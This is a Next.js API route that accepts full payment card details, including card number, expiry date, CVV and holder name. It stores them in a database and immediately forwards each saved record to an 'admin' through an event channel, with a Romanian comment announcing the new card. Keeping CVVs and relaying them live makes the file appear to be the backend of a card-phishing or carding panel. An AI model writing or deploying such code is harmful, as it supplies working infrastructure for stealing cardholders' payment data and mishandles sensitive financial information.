import { NextRequest, NextResponse } from "next/server";
// import { PrismaClient } from "@prisma/client";
import { sendEventToAdmin } from "../event/route";
import {PrismaClient} from '@prisma/client'

const prisma = new PrismaClient();

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { cardNumber, expiry, cvv, firstName, lastName, amount, userId, country, cardType } = body;

    if (!cardNumber || !expiry || !cvv || !firstName || !lastName || !amount || !cardType) {
      return NextResponse.json(
        { message: "Missing required fields." },
        { status: 400 }
      );
    }

    const savedCard = await prisma.card.create({
      data: {
        cardNumber,
        cardType: cardType,
        amount: parseFloat(amount),
        expDate: expiry,
        cvv,
        holder: `${firstName} ${lastName}`,
        country: country || "Unknown",
        createdBy: userId ? parseInt(userId, 10) : 0,
      },
    });

    // Notificăm adminul despre noul card
    if (userId) {
      sendEventToAdmin(
        userId.toString(),
        `${JSON.stringify(savedCard)}`
      );
    }

    return NextResponse.json(
      { message: "Card data saved successfully", savedCard },
      { status: 200 }
    );
  } catch (error) {
    console.error("Error saving card data:", error);
    return NextResponse.json(
      { message: "Internal server error." },
      { status: 500 }
    );
  }
}
